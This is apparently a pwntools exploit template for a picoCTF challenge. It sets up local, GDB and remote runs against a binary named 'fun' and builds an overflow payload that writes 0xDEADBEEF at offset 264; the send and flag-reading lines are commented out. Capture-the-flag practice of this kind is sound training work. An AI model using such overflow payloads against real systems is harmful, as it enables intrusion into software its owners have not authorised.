from pwn import *

conn = "nc mercury.picoctf.net 40525"
HOST = conn.split(" ")[1]
PORT = conn.split(" ")[2]

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
c
""".format(
    **locals()
)

# Binary filename
exe = "./fun"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

OFFSET = 264

payload = flat(
    {
        OFFSET: [
            p64(0xDEADBEEF),
        ]
    }
)


p = start()

# p.sendline(payload)
# f = p.recvall()
# print(f)
# flag = f.decode().split("picoCTF")
# print("picoCTF" + flag[1])
